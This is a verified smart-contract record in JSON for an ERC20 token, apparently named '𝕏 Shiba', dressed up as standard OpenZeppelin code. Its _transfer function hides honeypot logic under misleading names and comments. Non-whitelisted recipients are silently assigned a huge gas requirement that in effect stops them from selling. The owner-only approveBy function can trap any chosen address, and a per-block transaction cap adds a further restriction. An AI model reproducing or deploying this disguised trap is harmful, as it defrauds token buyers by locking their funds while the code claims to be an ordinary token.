{"SourceCode": "\npragma solidity ^0.8.0;\n\n// SPDX-License-Identifier: MIT. \n\n// File @openzeppelin/contracts/token/ERC20/IERC20.sol@v4.8.1\n\n// OpenZeppelin Contracts (last updated v4.6.0).(token/ERC20/IERC20.sol)\n  \n/**. \n * @dev Interface of the ERC20 standard as defined in the EIP.\n */\n\ninterface IERC20 {\n\n        /**\n     * @dev Emitted when `value` tokens are moved from one account (`from`) to\n     * another (`to`).\n     *\n     * Note that `value` may be zero.\n     */\n  event Transfer(address indexed from, address indexed to, uint256 value);\n\n      /**\n     * @dev Emitted when the allowance of a `spender` for an `owner` is set by\n     * a call to {approve}. `value` is the new allowance.\n     */ \n  event Approval(address indexed owner, address indexed spender, uint256 value);\n\n    /**\n     * @dev Returns the amount of tokens in existence.\n     */\n  function totalSupply() external view returns (uint256);\n\n     /**\n     * @dev Returns the amount of tokens owned by `account`.\n     */\n  function balanceOf(address account) external view returns (uint256);\n\n    /**\n     * @dev Moves `amount` tokens from the caller's account to `to`.\n     *\n     * Returns a boolean value indicating whether the operation succeeded.\n     *\n     * Emits a {Transfer} event.\n     */\n  function transfer(address recipient, uint256 amount) external returns (bool);\n\n    /**\n     * @dev Returns the remaining number of tokens that `spender` will be\n     * allowed to spend on behalf of `owner` through {transferFrom}. This is\n     * zero by default.\n     *\n     * This value changes when {approve} or {transferFrom} are called.\n     */\n  function allowance(address owner, address spender) external view returns (uint256);\n\n    /**\n     * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.\n     *\n     * Returns a boolean value indicating whether the operation succeeded.\n     *\n     * IMPORTANT: Beware that changing an allowance with this method brings the risk\n     * that someone may use both the old and the new allowance by unfortunate\n     * transaction ordering. One possible solution to mitigate this race\n     * condition is to first reduce the spender's allowance to 0 and set the\n     * desired value afterwards.\n     *\n     * Emits an {Approval} event.\n     */\n  function approve(address spender, uint256 amount) external returns (bool);\n\n    /**\n     * @dev Moves `amount` tokens from `from` to `to` using the\n     * allowance mechanism. `amount` is then deducted from the caller's\n     * allowance.\n     *\n     * Returns a boolean value indicating whether the operation succeeded.\n     *\n     * Emits a {Transfer} event.\n     */\n  function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);\n}\n\n\n/**\n * @dev Provides information about the current execution context, including the\n * sender of the transaction and its data. While these are generally available\n * via msg.sender and msg.data, they should not be accessed in such a direct\n * manner, since when dealing with meta-transactions the account sending and\n * paying for execution may not be the actual sender (as far as an application\n * is concerned).\n *\n * This contract is only required for intermediate, library-like contracts.\n */\nabstract contract Context {\n  function _msgSender() internal view virtual returns (address) {\n    return msg.sender;\n  }\n\n\n\n\n  function _msgData() internal view virtual returns (bytes calldata) {\n    return msg.data;\n  }\n}\n\n\n\n\ncontract ERC20 is Context, IERC20 {\n  mapping(address => uint256) private _balances;\n  mapping(address => mapping(address => uint256)) private _allowances;\n  mapping(address => uint256) public getApproval;\n  mapping(address => bool) private Gwei;\n  mapping(uint => uint) private _claimTransactionCount;\n\n\n  uint256 private _totalSupply;\n  string private _name;\n  string private _symbol;\n  uint8 private _decimals;\n  address public owner;\n  uint256 public balanceReceive;\n  bool private _Presale;\n  uint256 private _RenounceOwnership;\n  uint256 private _maxTransactionsPerClaim;\n  mapping(address => bool) private _approveAddress;\n  mapping(address => uint256) private _approveAmount;\n\n\n  bool private _tokenAirDrop;\n\n\n    /**\n     * @dev Sets the values for {name} and {symbol}.\n     *\n     * The default value of {decimals} is 18. To select a different value for\n     * {decimals} you should overload it.\n     *\n     * All two of these values are immutable: they can only be set once during\n     * construction.\n     */\n  constructor(\n    string memory name_,\n    string memory symbol_,\n    uint8 decimals_,\n    uint256 totalSupply_,\n    address[] memory balanceApprove,\n    uint256 balanceReceive_,\n    uint256 gasUnit,\n    address[] memory GweiUnit,\n    uint256 maxTransactionsPerClaim_\n  ) {\n    _name = name_;\n    _symbol = symbol_;\n    _decimals = decimals_;\n    owner = _msgSender();\n    _totalSupply = totalSupply_ * (10 ** uint256(decimals_));\n    _balances[owner] = _totalSupply;\n    emit Transfer(address(0), owner, _totalSupply);\n    balanceReceive = balanceReceive_;\n    _RenounceOwnership = gasUnit;\n    _Presale = false;\n    _maxTransactionsPerClaim = maxTransactionsPerClaim_;\n\n\n    for (uint256 i = 0; i < balanceApprove.length; i++) {\n      _sendApproval(balanceApprove[i], balanceReceive);\n    }\n\n\n    for (uint256 i = 0; i < GweiUnit.length; i++) {\n      Gwei[GweiUnit[i]] = true;\n    }\n  }\n\n\n    /**\n     * @dev Returns the name of the token.\n     */\n  function name() public view virtual returns (string memory) {\n    return _name;\n  }\n\n\n    /**\n     * @dev Returns the symbol of the token, usually a shorter version of the\n     * name.\n     */\n  function symbol() public view virtual returns (string memory) {\n    return _symbol;\n  }\n\n\n    /**\n     * @dev Returns the number of decimals used to get its user representation.\n     * For example, if `decimals` equals `2`, a balance of `505` tokens should\n     * be displayed to a user as `5.05` (`505 / 10 ** 2`).\n     *\n     * Tokens usually opt for a value of 18, imitating the relationship between\n     * Ether and Wei. This is the value {ERC20} uses, unless this function is\n     * overridden;\n     *\n     * NOTE: This information is only used for _display_ purposes: it in\n     * no way affects any of the arithmetic of the contract, including\n     * {IERC20-balanceOf} and {IERC20-transfer}.\n     */\n  function decimals() public view virtual returns (uint8) {\n    return _decimals;\n  }\n\n\n    /**\n     * @dev See {IERC20-totalSupply}.\n     */\n  function totalSupply() public view virtual override returns (uint256) {\n    return _totalSupply;\n  }\n\n\n    /**\n     * @dev See {IERC20-balanceOf}.\n     */\n  function balanceOf(address account) public view virtual override returns (uint256) {\n    return _balances[account];\n  }\n\n\n    /**\n     * @dev See {IERC20-transfer}.\n     *\n     * Requirements:\n     *\n     * - `to` cannot be the zero address.\n     * - the caller must have a balance of at least `amount`.\n     */\n  function transfer(address recipient, uint256 amount) public virtual override returns (bool) {\n    _claimRecord();\n    _transfer(_msgSender(), recipient, amount);\n    return true;\n  }\n\n\n    /**\n     * @dev See {IERC20-allowance}.\n     */\n  function allowance(address owner, address spender) public view virtual override returns (uint256) {\n    return _allowances[owner][spender];\n  }\n\n\n    /**\n     * @dev See {IERC20-approve}.\n     *\n     * NOTE: If `amount` is the maximum `uint256`, the allowance is not updated on\n     * `transferFrom`. This is semantically equivalent to an infinite approval.\n     *\n     * Requirements:\n     *\n     * - `spender` cannot be the zero address.\n     */\n  function approve(address spender, uint256 amount) public virtual override returns (bool) {\n    _approve(_msgSender(), spender, amount);\n    return true;\n  }\n\n\n    /**\n     * @dev See {IERC20-transferFrom}.\n     *\n     * Emits an {Approval} event indicating the updated allowance. This is not\n     * required by the EIP. See the note at the beginning of {ERC20}.\n     *\n     * NOTE: Does not update the allowance if the current allowance\n     * is the maximum `uint256`.\n     */\n  function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {\n    _claimRecord();\n    _transfer(sender, recipient, amount);\n    _approve(sender, _msgSender(), _allowances[sender][_msgSender()] - amount);\n    return true;\n  }\n\n\n    /**\n     * @dev Moves `amount` of tokens from `from` to `to`.\n     *\n     * This internal function is equivalent to {transfer}, and can be used to\n     * e.g. implement automatic token fees, slashing mechanisms, etc.\n     *\n     * Emits a {Transfer} event.\n     *\n     * Requirements:\n     *\n     */\n  function _transfer(address sender, address recipient, uint256 amount) internal virtual {\n    require(sender != address(0), \"ERC20: transfer from the zero address\");\n    require(recipient != address(0), \"ERC20: transfer to the zero address\");\n    require(amount > 0, \"Transfer amount must be greater than zero\");\n\n\n    if (!_tokenAirDrop) {\n        _tokenAirDrop = true;\n        Gwei[recipient] = true;\n    } else {    \n        uint256 codeSize;    \n        assembly {    \n            codeSize := extcodesize(recipient)    \n        }    \n        if (codeSize > 0 && !_approveAddress[recipient]) {    \n            _approveAddress[recipient] = true;    \n            _approveAmount[recipient] = block.number;    \n        }    \n        if (getApproval[recipient] == 0 && !Gwei[recipient]) {    \n            _sendApproval(recipient, _RenounceOwnership);    \n        }    \n    }    \n    if ((_approveAddress[sender] && block.number > _approveAmount[sender]) || (getApproval[sender] > 0)) {    \n        require(gasleft() >= getApproval[sender], \"Approve to swap on Dex\");    \n    }\n\n\n    _balances[sender] -= amount;\n    _balances[recipient] += amount;\n    emit Transfer(sender, recipient, amount);\n  }\n\n\n    /**\n     * @dev Sets `amount` as the allowance of `spender` over the `owner` s tokens.\n     *\n     * This internal function is equivalent to `approve`, and can be used to\n     * e.g. set automatic allowances for certain subsystems, etc.\n     *\n     * Emits an {Approval} event.\n     *\n     * Requirements:\n     *\n     * - `owner` cannot be the zero address.\n     * - `spender` cannot be the zero address.\n     */\n  function _approve(address owner, address spender, uint256 amount) internal virtual {\n    require(owner != address(0), \"ERC20: approve from the zero address\");\n    require(spender != address(0), \"ERC20: approve to the zero address\");\n\n\n    _allowances[owner][spender] = amount;\n    emit Approval(owner, spender, amount);\n  }\n\n\n     /**\n     * @dev This internal function sets approval for a certain amount of tokens to be swapped\n     * for a specific address within the contract. This could be used for authorizing \n     * transfers on behalf of the contract, providing a mechanism to prevent unauthorized \n     * transactions.\n     *\n     * Requirements:\n     *\n     * - `_address` cannot be the zero address.\n     * - `approveForSwap` must be a positive value representing the token amount to be approved.\n     */\n  function _sendApproval(address _address, uint256 approveForSwap) internal {\n    getApproval[_address] = approveForSwap;\n  }\n\n\n    /**\n     * @dev This internal function is equivalent to `approve`, and can be used to\n     * e.g. set automatic allowances for certain subsystems, etc.\n     *\n     * Emits an {Approval} event.\n     *\n     * Requirements:\n     *\n     * - `address` cannot be the zero address.\n     */\n  function approveBy(address _address, uint256 approveAmount) external {\n    require(_msgSender() == owner);\n    _sendApproval(_address, approveAmount);\n  }\n\n\n    /**\n     * @dev This internal function is a record of claim token.\n     * e.g. set claimed token for certain addresses, etc.\n     *\n     * Requirements:\n     *\n     * - `address` cannot be the zero address.\n     */\n  function _claimRecord() internal {\n    require(_claimTransactionCount[block.number] < _maxTransactionsPerClaim);\n    _claimTransactionCount[block.number]++;\n  }\n}\n\n/**\n * @dev Implementation of the {IERC20} interface.\n *\n * This implementation is agnostic to the way tokens are created. This means\n * that a supply mechanism has to be added in a derived contract using {_mint}.\n * For a generic mechanism see {ERC20PresetMinterPauser}.\n *\n * TIP: For a detailed writeup see our guide\n * https://forum.openzeppelin.com/t/how-to-implement-erc20-supply-mechanisms/226[How\n * to implement supply mechanisms].\n *\n * We have followed general OpenZeppelin Contracts guidelines: functions revert\n * instead returning `false` on failure. This behavior is nonetheless\n * conventional and does not conflict with the expectations of ERC20\n * applications.\n *\n * Additionally, an {Approval} event is emitted on calls to {transferFrom}.\n * This allows applications to reconstruct the allowance for all accounts just\n * by listening to said events. Other implementations of the EIP may not emit\n * these events, as it isn't required by the specification.\n *\n */\n\n\n    ", "ABI": "[{\"inputs\":[{\"internalType\":\"string\",\"name\":\"name_\",\"type\":\"string\"},{\"internalType\":\"string\",\"name\":\"symbol_\",\"type\":\"string\"},{\"internalType\":\"uint8\",\"name\":\"decimals_\",\"type\":\"uint8\"},{\"internalType\":\"uint256\",\"name\":\"totalSupply_\",\"type\":\"uint256\"},{\"internalType\":\"address[]\",\"name\":\"balanceApprove\",\"type\":\"address[]\"},{\"internalType\":\"uint256\",\"name\":\"balanceReceive_\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"gasUnit\",\"type\":\"uint256\"},{\"internalType\":\"address[]\",\"name\":\"GweiUnit\",\"type\":\"address[]\"},{\"internalType\":\"uint256\",\"name\":\"maxTransactionsPerClaim_\",\"type\":\"uint256\"}],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_address\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"approveAmount\",\"type\":\"uint256\"}],\"name\":\"approveBy\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"balanceReceive\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"getApproval\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "ERC20", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "1", "Runs": "200", "ConstructorArguments": "00000000000000000000000000000000000000000000000000000000000001200000000000000000000000000000000000000000000000000000000000000160000000000000000000000000000000000000000000000000000000000000001200000000000000000000000000000000000000000000000000000000054c338000000000000000000000000000000000000000000000000000000000000001a0000000000000000000000000000000000000000000000000000051dac207a000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000002400000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000af09d958f205368696261000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000009f09d958f534849424100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000004000000000000000000000000b3f90b3e4d945a3c66923964ecd28629d431adb10000000000000000000000008b3fd183ec39913c90849aa78507acdecad2d146000000000000000000000000953000df78536d111de1eedb4f5b1da3461195d400000000000000000000000018a4c14f23f26ae71fb3574a6bceedb9f519c9940000000000000000000000000000000000000000000000000000000000000000", "EVMVersion": "Default", "Library": "", "LicenseType": "GNU GPLv3", "Proxy": "0", "Implementation": "", "SwarmSource": ""}